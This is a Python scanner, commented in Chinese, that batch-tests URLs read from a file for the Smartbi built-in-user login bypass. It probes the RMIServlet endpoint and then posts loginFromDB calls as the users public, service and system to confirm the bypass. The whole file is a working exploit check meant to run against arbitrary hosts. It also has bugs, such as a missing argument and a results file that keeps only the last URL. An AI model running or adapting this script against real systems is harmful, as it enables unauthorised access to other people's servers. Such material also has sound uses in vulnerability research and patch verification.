import os.path
import re

import requests

class Smartbi():

    def readFile(self, name):
        '''
        此函数用于读取用户给出的待检测URL地址，并进行处理
        '''
        url = []
        with open(name, 'r', encoding='utf8') as f:
            ip = f.read().splitlines()
            for i in ip:
                if re.match(r'^https?:/{2}\w.+$', i):
                    url1 = i + '/smartbi/vision/RMIServlet'
                    url.append(url1)
                else:
                    url1 = 'http://' + i + '/smartbi/vision/RMIServlet'
                    url.append(url1)
        return url

    def request(self, url):
        '''
        此函数用于向网页发起请求，为了避免证书问题，将忽略证书
        '''
        response = requests.get(url=url, verify=False)
        return response

    def post_Request(self, url, data):
        '''
        该函数用于向漏洞地址进行验证
        '''
        header = {
            'Host': '45.77.159.209',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        try:
            for name in ["public", "service", "system"]:
                data = {f'className=UserService&methodName=loginFromDB&params=[{name},"0a"]'}
                response = requests.post(url=url, headers=header, data=data)
                if '{"retCode":0,"result":true,"duration":1}' in response.text:
                    return True
        except:
            print("漏洞不存在或出现请求错误！")
            return False

    def check(self):
        '''
        验证漏洞是否存在
        '''
        for url in self.readFile(name='url.txt'):
            try:
                if "尚未登录" in self.request(url=url).text:
                    with open('result.txt', 'w', encoding='utf8') as f:
                        f.write(url)
                        print(url + " 或许存在漏洞,等待验证")
            except:
                print('出现未知错误')

    def validation(self):
        if os.path.exists('result.txt'):
            for url in self.readFile(name='result.txt'):
                if self.post_Request(url=url):
                    print("漏洞验证成功")
                else:
                    print("漏洞未验证成功，请手动验证")
        else:
            print('result.txt不存在，程序自动退出')

    def main(self):
        '''
        脚本主入口
        '''
        self.menu()
        self.check()
    def menu(self):
        print(r'''
                                            ___.                  .__                         
        ______   ______  _  __ ___________  \_ |__ ___.__. _______|  |__   ____   ____  __ __ 
        \____ \ /  _ \ \/ \/ // __ \_  __ \  | __ <   |  | \___   /  |  \_/ __ \ / ___\|  |  \
        |  |_> >  <_> )     /\  ___/|  | \/  | \_\ \___  |  /    /|   Y  \  ___// /_/  >  |  /
        |   __/ \____/ \/\_/  \___  >__|     |___  / ____| /_____ \___|  /\___  >___  /|____/ 
        |__|                      \/             \/\/            \/    \/     \/_____/  

        本脚本用于验证Smartbi内置用户登陆绕过漏洞，单线程版本
        ------------------------------------------------------------------------------------------
        ''')


if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings()
    Smartbi = Smartbi()
    Smartbi.main()






(((((((((((((((())))))))))))))))